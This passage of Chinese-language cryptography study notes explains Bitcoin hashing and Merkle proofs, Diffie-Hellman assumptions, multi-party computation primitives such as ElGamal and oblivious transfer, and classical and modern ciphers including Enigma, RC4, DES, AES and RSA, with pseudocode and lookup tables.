<p>所以SDB不太安全，有了SDB+。</p>
<hr />
<p>参考链接：</p>
<p><a href="https://blog.alienx.cn/2019/11/07/E11071745/">保序加密-晓鹿</a></p>
<p>第一节课是12月13，20min的时候</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bitcoin-区块链技术"><a class="header" href="#bitcoin-区块链技术">Bitcoin-区块链技术</a></h1>
<h2 id="密码学基础"><a class="header" href="#密码学基础">密码学基础</a></h2>
<p>比特币被称为加密货币crypto-currency。区块链上内容都是公开的，包括区块的地址，转账的金额。</p>
<p>比特币主要用到了密码学中的两个功能:1.哈希2.签名</p>
<p>密码学中用到的哈希函数被称为cryptographic hash function:    它有两个重要的性质:</p>
<ol>
<li>collision(这里指哈希碰撞) resistance  :例如x≠y H(x)=H(y) 两个不同的输入，输出却是相等的，这就称哈希碰撞。它是不可避免的，因为输入空间总大于输出空间。给出x，很难找到y，除非蛮力求解(brute-force)。
该性质的作用:对一个message求digest
比如message取m m的哈希值是H(m)=digest 如果有人想篡改m值而H(m)不变，则无法做到。
哈希碰撞无法人为制造，无法验证，是根据实践经验得来的。</li>
<li>hiding 哈希函数的计算过程是单向的，不可逆的。(从H(x)无法推导出x) hiding性质前提是输入空间足够大，分布比较均匀。如果不是足够大，一般在x后面拼接一个随机数，如H(x||nonce)。（如果不是足够大的输入空间，可以用蛮力破解）
该性质的作用:和collision resistance 结合在一起，用来实现digital commitment(又称为digital equivalent of a sealed envelope)
把预测结果作为输入x，算出一个哈希值，讲哈希值公布，hiding让人们知道哈希值而不知道预测值，最后再将x公布，因为有collision resistance的性质，预测结果是不可篡改的。</li>
</ol>
<p>除了密码学中要求的这两个性质外，比特币中用到的哈希函数还有第三个性质:</p>
<ol start="3">
<li>puzzle friendly 指哈希值的预算事先是不可预测的。假如哈希值是00...0XX...X，一样事先无法知道哪个值更容易算出这个结果，还是要一个一个带入。</li>
</ol>
<p>比特币挖矿的过程中实际就是找一个nonce，nonce跟区块的块头里的其他信息合一起作为输入，得出的哈希值要小于等于某个指定的目标预值。H(block header)≤target。block header 指块头，块头里有很多域，其中一个域是我们可以设置的随机数nonce，挖矿的过程是不停的试随机数，使得block header取哈希后落在指定的范围之内。</p>
<p>puzzle friendly是指挖矿过程中没有捷径，为了使输出值落在指定范围，只能一个一个去试。所以这个过程还可以作为工作量证明(proof of work)。
挖矿很难，验证很容易。(difficult to solve ,but easy to verify)</p>
<p>比特币中用的哈希函数叫作SHA-256(secure hash algorithm )以上三个性质它都是满足的。</p>
<hr />
<p>在比特币系统中开账户:
在本地创立一个公私钥匙对(public key ,private key)，这就是一个账户。公私钥匙对是来自于非对称的加密技术(asymmetric encryption algorithm)。</p>
<h2 id="比特币的数据结构"><a class="header" href="#比特币的数据结构">比特币的数据结构</a></h2>
<p>普通指针存储的是某个结构体在内存中的地址。假如P是指向一结构体的指针，那么P里面存放的就是该结构体在内存中的起始位置。而<strong>哈希指针除了要存地址之外，还要保存该结构体的哈希值H()</strong>。好处是:从哈希值这个哈希指针，不仅可以找到该结构体的位置，同时还能够检测出该结构体的内容有没有被篡改，因为我们保存了它的哈希值。</p>
<p>比特币中最基本的结构就是<strong>区块链</strong>，区块链就是一个一个区块组成的链表。区块链和普通的链表相比有什么区别:</p>
<ol>
<li>用哈希指针代替了普通指针(B block chain is a linked list using hash pointers)。区块链第一个区块叫作创世纪块(genesis block)，最后一个区块 是最近产生的区块(most recent block) 每一个区块都包含指向前一个区块的哈希指针。一个区块的哈希指针怎么算:是把前面整个区块的内容，包括里面的hash pointer ，合在一起取哈希值。通过这种结构，可以实现tamper-evident log。如果有人改变了一个区块的内容，后面一个区块的哈希指针就对不上，因为后一个区块哈希指针是根据前一个区块的内容算出来的，所以后一个哈希指针也得改，以此类推，我们保留的是最后一个哈希值也会变化。</li>
<li>普通链表可以改变任意一个元素，对链表中其他元素是没有影响的。而区块链是牵一发而动全身，因为只需要保存最后一个哈希值，就可以判断区块链有没有改变，在哪里改变了。
因此比特币没有要保存所有区块的内容，可以只保留最近的几千个区块。如果要用到以前的区块，可以向系统中其他节点要这个区块。有些节点是有恶意的，怎么判断?这里要用到哈希值一个性质，如下:
其他节点给你一个区块，如何判断它是正确的?算出它的哈希值，与保留的区块的哈希值对比，即可。</li>
</ol>
<p>比特币中的另外一个结构是:<strong>Merkle tree</strong>。其中最下面一层是数据块(data blocks)，上面三层内部节点都是哈希指针(hash pointers)，第一层是根节点，根节点的区块也可以取个哈希，叫根哈希(root hash)</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210913135628236.png" alt="image-20210913135628236" /></p>
<p>这种结构的好处：只要记住根哈希值，就能检测出对树中任何部位的修改。</p>
<p>和二叉树的区别：用哈希指针代替了普通指针。比特币当中各区块之间用哈希指针连接在一起，每个区块所包含的交易组织成一个merkle tree的形式，最下面一行data blocks每个区块实际上是一个交易，每个区块分为两部分，分别是块头和块身(block header ,block body)。块头里面有根哈希值，每个区块所包含的所有交易组成的merkle tree的根哈希值存在于区块的块头里面，但是，块头里没有交易的具体内容，只有一个根哈希值，块身里面是有交易的列表的。</p>
<p>merkle tree 的作用：提供<strong>merkle proof</strong> 。比特币中的节点分为两类:全节点(保存整个区块的内容，即块头块身都有，有交易的具体信息)和轻节点(例如手机上的比特币钱包)(只有块头)这时存在一个问题:如何向一个轻节点证明某个交易是写入区块链的?这时需要用到merkle proof :找到交易所在的位置(最底行的其中一个区块)，这时该区块一直往上到根节点的路径就叫merkle proof。</p>
<ul>
<li>
<p>proof of membership。最上面一行是小型的区块链，该图展现的是一个区块的merkle tree，最下面一行是包含的交易。假设某个轻节点想知道图中黄色的交易，是否包含在了merkle tree里面。该轻节点没有包含交易列表，没有这颗merkle tree的具体内容，只有一个根哈希值。这时轻节点向一个全节点发出请求，请求证明黄色的交易被包含在这颗merkle tree里面的merkle proof。全节点收到这个请求之后，只需要将图中标为红色的这三个哈希值发给轻节点即可。有了这些哈希值之后，轻节点可以在本地计算出图中标为绿色三个哈希值。首先算出黄色交易的哈希值，即它正上方的那个绿的哈希值，然后跟旁边红色的哈希值拼接起来，可以算出上层节点绿色的哈希值。然后再拼接，再算出上层绿色哈希值，再拼接，就可以算出整棵树的根哈希值。轻节点把这个根哈希值和block header里的根哈希值比较一下，就能知道黄色的交易是否在这颗merkle tree里。</p>
<p>全节点在merkle proof里提供的这几个哈希值，就是从黄色的交易所在的节点的位置到树根的路径上用到的这些哈希值。轻节点收到这样一个merkle proof之后，只要从下往上验证，沿途的哈希值都是正确的即可。(验证时只能验证该路径的哈希值，其他路径是验证不了的，即该图中红色的哈希值是验证不了的)</p>
<p>这样是否不安全呢?假如黄色交易被篡改，它的哈希值发生了变化，那能不能调整旁边红色的哈希值，使得它们拼接起来的哈希值是不变的呢?不行，根据collision resistance，这是不可行的。</p>
<p>merkle proof可以证明merkle tree里面包含了某个交易，所以这种证明又叫proof of membership或 proof of inclusion。
对于一个轻节点来说，验证一个merkle proof 复杂度是多少?假设最底层有n个交易，则merkle proof 复杂程度是θ(log(n))</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210913135948221.png" alt="image-20210913135948221" /></p>
</li>
<li>
<p>proof of non-membership。如何证明merkle tree里面没有包含某个交易？可以把整棵树传给轻节点，轻节点收到后验证树的构造都是对的，每一层用到的哈希值都是正确的，说明树里只有这些叶节点，要找的交易不在里面，就证明了proof of non-membership。问题在于，它的复杂度是线性的θ(n)，是比较笨的方法。</p>
<p>如果对叶节点的排列顺序做一些要求，比如按照交易的哈希值排序。每一个叶节点都是一次交易，对交易的内容取一次哈希，按照哈希值从小到大排列。要查的交易先算出一个哈希值，看看如果它在里面该是哪个位置。比如说在第三个第四个之间，这时提供的proof是第三个第四个叶节点都要往上到根节点。如果其中哈希值都是正确的，最后根节点算出的哈希值也是没有被改过的，说明第三、四个节点在原来的merkle tree里面，确实是相邻的点。要找的交易如果存在的话，应该在这两个节点中间。但是它没有出现，所以就不存在。其复杂度也是log形式，代价是要排序。排好序的叫作sorted merkle tree。比特币中没有用到这种排好序的merkle tree，因为比特币中不需要做不存在证明。</p>
</li>
</ul>
<h2 id="协议"><a class="header" href="#协议">协议</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="可证明安全"><a class="header" href="#可证明安全">可证明安全</a></h1>
<p>老师讲了Diffie Hellman建key的安全性证明。下面是三个<strong>假设</strong>：</p>
<ul>
<li>DL(Discrete logarithm，离散对数问题)。简单的说，就是给定$g^s$，难以计算出$s$。</li>
<li>CDH，证明了key recovery security。简单来说，就是给定$g^s,g^t$，难以计算$g^{st}$。</li>
<li>DDH(Decisional Diffie-Hellman)证明了indistinguishable，更强的安全。简单来说，就是给定$g^s,g^t$，再给两个$g^{x},g^{st}$，你难以分辨$g^x$和$g^{st}$。</li>
</ul>
<p>难以的意思是不能在多项式时间(poly)内以较大的概率(negl)猜对。数学的写法是PPT上的</p>
<p><img src="Basic/Secure/Crypto/../images/image-20220108211825057.png" alt="image-20220108211825057" /></p>
<p><img src="Basic/Secure/Crypto/../images/image-20220108211804263.png" alt="image-20220108211804263" /></p>
<p>https://blog.csdn.net/weixin_48383957/article/details/122272863</p>
<hr />
<p>如果可以破解DL，可以破解CDH。这是显然的。</p>
<p>如果可以破解CDH，可以破解DDH。其实也比较显然。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20220108202539187.png" alt="image-20220108202539187" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="安全多方计算"><a class="header" href="#安全多方计算">安全多方计算</a></h1>
<p>安全多方计算（Secure Multi-Party Computation，学术界简称MPC或SMPC）是一种通用的密码原语，它在不泄露参与方原始输入数据的前提下，允许分布式参与方合作计算任意函数，输出准确的计算结果。</p>
<p>如果对于拥有无限计算能力攻击者而言是安全的，则称作是<strong>信息论安全的或无条件安全的</strong>；如果对于拥有多项式计算能力的攻击者是安全的，则称为是<strong>密码学安全的或条件安全的</strong>。</p>
<p>不经意传输（Oblivious Transfer, OT）是安全多方计算的基石。</p>
<p>IND-CPA是更强的安全保证，之前提过另外两个。</p>
<ol>
<li>即使在adv自己选择明文m0,m1的情况下，对于密文cx，也无法分辨属于哪个明文。</li>
<li>或者，对于adv自己选择明文m，对于密文cx1,cx2，也无法分辨哪个属于明文。</li>
</ol>
<p><img src="Basic/Secure/Crypto/../images/image-20220109004048889.png" alt="image-20220109004048889" /></p>
<p>选择密文安全（chosen ciphertext security，即CCA-security）CPA（Chosen-Plaintext Attack），选择明文攻击。</p>
<h2 id="elgamal"><a class="header" href="#elgamal"><a href="https://zh.wikipedia.org/wiki/ElGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95">Elgamal</a></a></h2>
<p>比如，我们通过DH建立了$key=g^{st}$，记做sk。</p>
<p>自带<strong>乘法同态</strong>，$Enc(m,r)\times Enc(n,t) = Enc(m\times n,r+t)$。在Elgamal中，$(m,r)=(m\times h^r,g^r)$。</p>
<p>Lifted Elgamal还可以实现<strong>加法同态</strong>，在<strong>m较小</strong>可以从$g^m\rightarrow m$的情况下，$(m,r)=(g^mh^r,g^r)$。
$$
Enc(m1+m2,r1+r2) \
= (g^{m1+m2}\times h^{r1+r2},g^{r1+r2})\
=(g^{m1}h^{r1}\times g^{m2}h^{m2},g^{r1}\times g^{r2})\
=Enc(m1,r1)\times Enc(m2,r2)
$$
可以用这个计算放射函数（一次函数）。如果不是一次函数的计算，我们需要做一些预计算，把他转换成一次函数。来看一个两方安全计算的例子：</p>
<p><img src="Basic/Secure/Crypto/../images/liftedelgamal.drawio.svg" alt="liftedelgamal.drawio" /></p>
<p>如果使用lifted elgamal，那么这里的</p>
<ul>
<li>$pka = a,pkb = b, sk = g^{ab}$</li>
<li>$ca = Enc(a,r)$ 就是 $ca = (g^ah^r,g^r)$，其中$h=g^a$</li>
<li>$cb = (g^{ab+d}h^{rb+r'},g^{rb+r'})$，可以自己演算一下，要注意的是，即使d=0，也应该引入$Enc(d,r')$实现rerandonmize。</li>
<li>解密是如何进行的呢？其实就是$\frac{g^{ab+d}h^{rb+r'}}{(g^{rb+r'})^a} = g^{ab+d}$。在ab+d不大的情况下（比如小于40bit），可以从$g^{ab+d}$算出$ab+d$。</li>
</ul>
<p>在IND-CPA意义上，和DDH是等价的。</p>
<h2 id="garbled-circuits"><a class="header" href="#garbled-circuits">Garbled Circuits</a></h2>
<h2 id="oblivious-transfer"><a class="header" href="#oblivious-transfer">Oblivious Transfer</a></h2>
<h3 id="一个方法"><a class="header" href="#一个方法">一个方法</a></h3>
<p><img src="Basic/Secure/Crypto/../images/image-20220109212316277.png" alt="image-20220109212316277" /></p>
<h3 id="secret-sharing"><a class="header" href="#secret-sharing">Secret sharing</a></h3>
<p><img src="Basic/Secure/Crypto/../images/image-20220109215211815.png" alt="image-20220109215211815" /></p>
<ul>
<li>
<p>Alice把输入a变成a0 xor a1，把a1发给Bob</p>
</li>
<li>
<p>Bob把输入b变成b0 xor b1，把b0发给Alice</p>
</li>
<li>
<p>如果要计算a xor b = (a0 xor a1) xor (b0 xor b1) = (a0 xor b0) xor (a1 xor b1)</p>
</li>
<li>
<p>如果要计算a and b</p>
<p><img src="Basic/Secure/Crypto/../images/image-20220109220041052.png" alt="image-20220109220041052" /></p>
</li>
</ul>
<h3 id="lifted-elgamal"><a class="header" href="#lifted-elgamal">Lifted elgamal</a></h3>
<p>可以用lifted elgamal实现2-1OT。</p>
<p>比如要2选1的$(f_0,f_1)$。那么构造线性函数$f(x) = f_0x+f_1(1-x)$，发送方发送$x=0$ 或 $x=1$。</p>
<blockquote>
<p>1-out-of-n From 1-out-of-2</p>
<p>We show how to construct a 1-out-of-nn OT protocol from any 1-out-of-2 OT protocol.</p>
<p>Suppose $A$ has $m_0,...,m_N∈{0,1}^n$ and $B$ has $t∈{0,...,N}$. Assume $N=2^l−1$ for some $l$.</p>
<ol>
<li>
<p>$A$ prepares $2l$ keys $(K^0_1,K^1_1),...,(K^0_l,K^1_l)$.</p>
</li>
<li>
<p>Let $F_k:{0,1}^l→{0,1}^n$ be a PRF(伪随机方程). A sends to B the tuple ($C_0,...,C_N)$: view the message index as a bit string $I=I_1...I_l∈{0,1}^l$, and encrypt using</p>
<p>$C_I=m_I⊕ ⊕^l_{i=1}F_{K^{I_i}_i}(I)$</p>
<p>Note A sends O(N) bits to B.</p>
</li>
<li>
<p>Let $t=t1...tl∈{0,1}l$. Then $l$ 1-out-of-2 OT’s are performed where during the $j$th OT, A has $(K0j,K1j)$ and B has $tj∈{0,1}$.</p>
</li>
<li>
<p>$B$ now has $K^{t_1}_1,...,K^{t_l}_l$ and can decrypt $Ct$ to get $mt$.</p>
</li>
</ol>
<p>Thus with $logN$ 1-out-of-2 OT’s, a single 1-out-of-N OT can be constructed, that has $O(N)$ communication complexity.</p>
</blockquote>
<hr />
<p>http://blog.nsfocus.net/calcul-ns/</p>
<p>https://crypto.stanford.edu/pbc/notes/crypto/ot.html</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="密码学算法介绍"><a class="header" href="#密码学算法介绍">密码学算法介绍</a></h1>
<h2 id="古典加密算法"><a class="header" href="#古典加密算法">古典加密算法</a></h2>
<h3 id="单表密码"><a class="header" href="#单表密码">单表密码</a></h3>
<p>明文字母和密文字母一一映射。
比如凯撒加密算法，把字母进行偏移。
可以通过频率分析法破解单表密码。</p>
<ul>
<li>加法密码（凯撒密码）</li>
<li>乘法密码
<ul>
<li>加密算法: $y = x*k % n$</li>
<li>解密算法: $x = y*k^{-1} % n$ 其中$k^{-1}$是k的乘法逆元</li>
</ul>
</li>
<li><strong>仿射密码</strong>（加法密码和乘法密码的结合）：
<ul>
<li>加密算法: $y = (x*k1 + k2) % n$</li>
<li>解密算法: $x = (y-k2)*k1^{-1} % n$(注意准确的说是加上k2的加法逆元)。</li>
</ul>
</li>
<li>置换密码</li>
</ul>
<h3 id="多表密码"><a class="header" href="#多表密码">多表密码</a></h3>
<ul>
<li>
<p>Vigenere 多表简单加法密码</p>
<ul>
<li>加密算法: $y = (x+k_i) % n$</li>
<li>解密算法: $x = (y-k_i) % n$ 其中$k^{-1}$是k的乘法逆元</li>
</ul>
</li>
<li>
<p>Enigma 虽然是老技术，但是是考试重点啊</p>
<ul>
<li>
<p>加密需要的信息：</p>
<ol>
<li>三个齿轮的外部状态MessageKey。需要注意的是，当按下某个键时，对该键进行加密的密钥并非当前齿轮的状态，而是齿轮转了一下以后的状态。如果初始设定是‘AAZ’，那么加密第一个信息时候的密钥是‘AAA’</li>
<li>齿轮的内部设定ring setting，</li>
<li>三个齿轮对应的映射情况。Enigma机器一共有5种齿轮，对应不同的映射表。</li>
<li>接线板的设置。</li>
</ol>
</li>
<li>
<p>加密的过程：</p>
<ol>
<li>PlugBoard-&gt;Rotor 1-&gt;Rotor 2-&gt;Rotor 3-&gt;Reflect-&gt;Rotor 3反查-&gt;Rotor 2反查-&gt;Rotor 1反查-&gt;PlugBoard反查。PlugBoard和Reflect都是查表，PlugBoard的表是可以自己配置的。Rotor的步骤要复杂一点：</li>
</ol>
</li>
</ul>
</li>
</ul>
<pre><code>           // MK MessageKey 齿轮的外部状态 RS RingSetting 齿轮的内部状态
           delta = e[i].MK-e[i].RS;
           // 正着查
           input = (e[i].table[(input-'A'+delta+26)%26]-'A'-delta+26)%26+'A';		
           // 反着查
           input = (e[i].rtable[(input-'A'+delta+26)%26]-'A'-delta+26)%26+'A';
</code></pre>
<pre><code>    2. 每次输入一个字母都会引起第一个齿轮Rotor1的转动。然后‘QEVJZ-&gt;‘RFWKA’（对应五种齿轮）是进位，会引起下一个齿轮的转动。还存在一个double stepping现象，就是当rotor 1转动到**进位后**把rotor 2带动到了**进位前**的位置，然后下一轮rotor 2会再转一次带动rotor 3。
</code></pre>
<h2 id="现代密码算法"><a class="header" href="#现代密码算法">现代密码算法</a></h2>
<h3 id="rc4-流加密算法"><a class="header" href="#rc4-流加密算法">RC4 流加密算法</a></h3>
<p>流加密的算法特点是速度非常快。适合大数据的即时传播。<a href="https://en.wikipedia.org/wiki/RC4#Description">参考链接-wiki</a></p>
<p>首先得到 A permutation of all 256 possible bytes <code>S</code>. 我们需要传入一个initalize <code>key</code>。</p>
<pre><code class="language-pascal">for i from 0 to 255
    S[i] := i
endfor
j := 0
for i from 0 to 255
    j := (j + S[i] + key[i mod keylength]) mod 256
    swap values of S[i] and S[j]
endfor
</code></pre>
<p>然后我们根据<code>S</code>对明文<code>plain</code>进行加密得到密文<code>cipher</code>。加密的过程是简单的异或，异或的内容从<code>S</code>中产生。所以解密的过程是一样的。</p>
<pre><code class="language-pascal">i := 0
j := 0
for l from 0 to plainlength
    i := (i + 1) mod 256
    j := (j + S[i]) mod 256
    swap values of S[i] and S[j]
    K := S[(S[i] + S[j]) mod 256]
    cipher[l] := plain[l] xor K
endfor
</code></pre>
<p>整个算法都是非常简单的。</p>
<h3 id="des-对称密钥加密算法star"><a class="header" href="#des-对称密钥加密算法star">DES 对称密钥加密算法:star:</a></h3>
<p>https://www.ruanx.net/des/
明文是 64位=8字节。密文也是64位=8字节。密钥是64位=8字节（或者说是56 bit，因为每个byte的第8位是没有用的）。为什么这里要用位数做单位呢？因为DES是基于位的加密算法。DES加密与解密的密钥相同，称为<strong>对称加密算法</strong>。</p>
<center>
    DES是把64 bit明文通过56 bit密钥加密成64 bit密文的算法
</center>
<p><img src="Basic/Secure/Crypto/../images/image-20210412184115493.png" alt="image-20210412184115493" /></p>
<p><strong>扩展欧几里徳算法</strong>用来求乘法逆元（在RSA中也有用处）。下面这个程序是对于求整数的乘法逆元而言的</p>
<pre><code class="language-python">def ext_euclid(a, b):
    '''因为r是单调递减的，所以程序一定会终止'''
    old_s,s=1,0
    old_t,t=0,1
    old_r,r=a,b
    if b == 0:
        return 1, 0, a
    else:
        while(r!=0):
            q=old_r//r
            old_r,r=r,old_r-q*r
            old_s,s=s,old_s-q*s
            old_t,t=t,old_t-q*t
    return old_s, old_t, old_r
</code></pre>
<p>此时所得的$s_{i}$和$t_{i}$即满足等式$gcd(a,b)=r_{i}=as_{i}+bt_{i}$。因为AES中我们的模数是素数，所以gcd(a,b)=1。</p>
<p>上面的程序表达的是$r_{i+1} = r_{i-1}+r_iq_i$,$s_{i+1} = s_{i-1}+s_iq_i$,$t_{i+1} = t_{i-1}+t_iq_i$</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210627155954613.png" alt="image-20210627155954613" /></p>
<p>那么，对于AES来说，我们应该用扩展欧几里徳算法求扩展域中多项式的乘法逆元。</p>
<pre><code class="language-C">计算(x^2)*P = 1 (mod x^3+1)的P

0       1       x^3+x+1
1       0       x^2         x
x       1       x+1         x
x^2     x       x           1
x^2+x+1 x+1     1           terminate
</code></pre>
<h3 id="aes-对称密钥加密算法"><a class="header" href="#aes-对称密钥加密算法">AES 对称密钥加密算法</a></h3>
<p>概述：要进行$n_r+1$次密钥编排和$n_r$次轮加密，然后得到最终的加密结果。输入是128 bit，输出也是128 bit。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210419174556828.png" alt="image-20210419174556828" /></p>
<p>和DES类似，也是每一次计算出一个轮密钥$k_i$。</p>
<p>第1轮到第$n_r$轮的结构：</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210419182927970.png" alt="image-20210419182927970" /></p>
<p>下面分别介绍每一个模块</p>
<h4 id="byte-substitution"><a class="header" href="#byte-substitution">Byte Substitution</a></h4>
<p>S-Box是AES加密中唯一一个非线性元素，即$ByteSub(A) +ByteSub(B)\neq ByteSub(A+B)$。在AES中是以字节(8 bits)为单位进行转换的。假设S-box的操作为 $s=f(a)$，那么S-box的操作为：</p>
<ul>
<li>先求出输入a的逆元b，上面介绍过AES用的逆元了。 </li>
<li>再进行仿射变换：<img src="Basic/Secure/Crypto/../images/a9264883346d442ea5a0135b5e4860ee3ff2f455.svg" alt="a9264883346d442ea5a0135b5e4860ee3ff2f455" /></li>
</ul>
<pre><code class="language-c">AES用的逆元 输入为XY
XY0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
0 00 01 8D F6 CB 52 7B D1 E8 4F 29 C0 B0 E1 E5 C7
1 74 B4 AA 4B 99 2B 60 5F 58 3F FD CC FF 40 EE B2
2 3A 6E 5A F1 55 4D A8 C9 C1 0A 98 15 30 44 A2 C2
3 2C 45 92 6C F3 39 66 42 F2 35 20 6F 77 BB 59 19
4 1D FE 37 67 2D 31 F5 69 A7 64 AB 13 54 25 E9 09
5 ED 5C 05 CA 4C 24 87 BF 18 3E 22 F0 51 EC 61 17
6 16 5E AF D3 49 A6 36 43 F4 47 91 DF 33 93 21 3B
7 79 B7 97 85 10 B5 BA 3C B6 70 D0 06 A1 FA 81 82
8 83 7E 7F 80 96 73 BE 56 9B 9E 95 D9 F7 02 B9 A4
9 DE 6A 32 6D D8 8A 84 72 2A 14 9F 88 F9 DC 89 9A
A FB 7C 2E C3 8F B8 65 48 26 C8 12 4A CE E7 D2 62
B 0C E0 1F EF 11 75 78 71 A5 8E 76 3D BD BC 86 57
C 0B 28 2F A3 DA D4 E4 0F A9 27 53 04 1B FC AC E6
D 7A 07 AE 63 C5 DB E2 EA 94 8B C4 D5 9D F8 90 6B
E B1 0D D6 EB C6 0E CF AD 08 4E D7 E3 5D 50 1E B3
F 5B 23 38 34 68 46 03 8C DD 9C 7D A0 CD 1A 41 1C

AES的S-box 假设输入为XY
XY0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F
0 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76
1 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0
2 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15
3 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75
4 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84
5 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF
6 D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8
7 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2
8 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73
9 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB
A E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79
B E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08
C BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A
D 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E
E E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF
F 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16
</code></pre>
<h4 id="diffusion-layer--shiftrow--mixcolumn"><a class="header" href="#diffusion-layer--shiftrow--mixcolumn">Diffusion Layer : ShiftRow &amp; MixColumn</a></h4>
<ul>
<li>ShiftRow：注意这个是一列一列看的</li>
</ul>
<pre><code class="language-c">  B0 B4 B8 B12				B0 B4 B8 B12
  B1 B5 B9 B13		=&gt;		B5 B9 B13 B1
  B2 B6 B10 B14		=&gt;		B10 B14 B2 B6
  B3 B7 B11 B15				B15 B3 B7 B11
</code></pre>
<ul>
<li>
<p>MixColum：这里的乘法也是伽罗瓦域内的乘法，多项式乘法。这里的乘法是指有限域$GF(2^8)$多项式模$(X^4+1)$乘法。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210426193045934.png" alt="image-20210426193045934" /></p>
<p>还是举一个例子：</p>
</li>
</ul>
<pre><code class="language-c">  matrix |       B       |     mod 0x11 multiply  |     xor      |      C     |
  -
  2 3 1 1	  4	B4 B8 B12    2*4 ^ 3*3 ^ 1*2 ^ 1*1 = 8 ^ 5 ^ 2 ^ 1 = E C4 C8  C12
  1 2 3 1	  3	B9 B13 B1    1*4 ^ 2*3 ^ 3*2 ^ 1*1 = 4 ^ 6 ^ 6 ^ 1 = 5 C5 C9  C13
  1 1 2 3	  2	B14 B2 B6  = 1*4 ^ 1*3 ^ 2*2 ^ 3*1 = 4 ^ 3 ^ 4 ^ 3 = 0 C6 C10 C14
  3 1 1 2	  1	B3 B7 B11    3*4 ^ 1*3 ^ 1*2 ^ 2*1 = C ^ 3 ^ 2 ^ 2 = F C7 C11 C15
</code></pre>
<h4 id="key-addition-layer"><a class="header" href="#key-addition-layer">Key Addition Layer</a></h4>
<p>这个比较简单，就是把得到的C和输入的$K_i$进行xor(加法)</p>
<h4 id="key-schedule"><a class="header" href="#key-schedule">Key Schedule</a></h4>
<p>那么剩下的就是，这些$K_i$，是怎么来的？我们输入的密钥K有128,192,256位的，但是我们的$K_i$是128 bit的。这就是key schedule。</p>
<p>以128 Bits的K为例。key schedule的过程如图所示，K是原始密钥。</p>
<p>用公式表达就是 $W[4i] = W[4(i−1)]+g(W[4i−1])$，$W[4i+j] = W[4(i-1)+j]+W[4i+j-1],j=1,2,3$。那么函数g又是什么呢？</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210510185337436.png" alt="image-20210510185337436" /></p>
<p>函数g是一个非线性元素，用来抵抗某些工具。g首先将输入的4个字节翻转，然后执行一个S-box的代换，最后和<strong>轮系数RC</strong>相加。</p>
<p>$RC[1] = x^0 = (00000001)_2,$
$RC[2] = x^1 = (00000010)_2,$
$RC[3] = x^2 = (00000100)_2,$
$......$
$RC[10] = x^9 = (00110110)_2.$</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210510185616412.png" alt="image-20210510185616412" /></p>
<p>由于我们的128 bit AES一共迭代10轮，一共需要11个128bit的子密钥。</p>
<p>对于192 bit的K的情况，我们的AES加密需要进行12轮，需要<code>(12+1)*4=52</code>个密钥。由于一次可以产生6个，所以我们的密钥编排进行<code>ceil(52/6)-1=9-1=8</code>轮。</p>
<p>对于256 bit的K的情况，我们的AES加密需要进行14轮，得到<code>(14+1)*4=60</code>个密钥。由于一次可以产生8个，所以我们的密钥编排进行<code>ceil(60/8)-1=7</code>轮。这里还引入了h，不再介绍。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210510191119879.png" alt="image-20210510191119879" /></p>
<p>由于AES并非基于Feistel网络，所以加密和解密并不能用同一种办法解决。所有的层必须颠倒过来，ShiftRow变成InverseShiftRow，MixColumn变成InverseMixColumn，密钥编排也要逆向。</p>
<p><img src="Basic/Secure/Crypto/../images/image-20210514133111304.png" alt="image-20210514133111304" /></p>
<p><img src="Basic/Secure/Crypto/../images/image-20210514133041473.png" alt="image-20210514133041473" /></p>
<h3 id="rsa-非对称密钥加密算法star"><a class="header" href="#rsa-非对称密钥加密算法star">RSA 非对称密钥加密算法:star:</a></h3>
<h4 id="数学基础"><a class="header" href="#数学基础">数学基础</a></h4>
<p>欧拉函数：$\Phi(n)$=小于n且与n互素的整数个数​。我们可以用分解质因数的办法求欧拉函数的值。（这里的$\Phi$就是下面的$\Phi$）。</p>
<p>我们可以得到当x,y是素数的时候，$\Phi(xy)=\Phi(x)\Phi(y)$</p>
<p>费马小定理：如果p是一个素数，$a^p \equiv a(mod\ p)$，或者说$a^{p-1} \equiv 1(mod\ p)$。是欧拉定理的一个特殊情况。</p>
<p>欧拉定理：如果$gcd(a,m)=1$，则有$a^{\Phi(m)} \equiv 1(mod\ m)$。	</p>
<p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86#%E5%BD%A2%E5%BC%8F%E6%8F%8F%E8%BF%B0">中国剩余定理CRT</a> 求解同余问题“韩信点兵”。证明过程差不多就是构造过程了。注意下面的数论倒数就是逆元，逆元不一定存在，求逆元可以用扩展<u>欧几里徳算法</u>。</p>
